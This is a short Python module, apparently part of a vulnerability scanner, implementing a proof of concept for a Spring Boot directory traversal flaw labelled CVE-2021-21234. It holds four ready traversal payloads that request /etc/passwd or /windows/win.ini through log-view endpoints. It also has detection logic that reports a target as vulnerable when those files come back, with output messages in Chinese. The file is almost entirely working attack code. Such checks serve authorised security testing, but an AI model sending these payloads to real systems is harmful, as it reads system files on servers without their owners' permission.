# coding:utf-8

import requests

class CVE_2021_21234:
    def __init__(self):
        self.payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        self.payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        self.payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
        self.payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    def poc(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            requests.packages.urllib3.disable_warnings()
            re1 = requests.post(url=url + self.payload1, verify=False, proxies=proxies)
            re2 = requests.post(url=url + self.payload2, verify=False, proxies=proxies)
            re3 = requests.post(url=url + self.payload3, verify=False, proxies=proxies)
            re4 = requests.post(url=url + self.payload4, verify=False, proxies=proxies)
            if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
                result = "[+] 发现Spring Boot目录遍历漏洞且系统为Win\n"
                result1 = f"{url + self.payload1}\n"
                result2 = f"{url + self.payload2}"
                return result + result1 + result2
            elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
                result = "[+] 发现Spring Boot目录遍历漏洞且系统为Linux\n"
                result1 = f"{url + self.payload3}\n"
                result2 = f"{url + self.payload4}"
                return result + result1 + result2
            else:
                result = f"[-] {url} 未发现Spring Boot目录遍历漏洞"
                return result
        except Exception as e:
            error = f"[error] {url} 未知错误 {e}"
            return error
    def exp(self,url,proxies,ProxyStute):
        # 目录遍历不存在EXP
        pass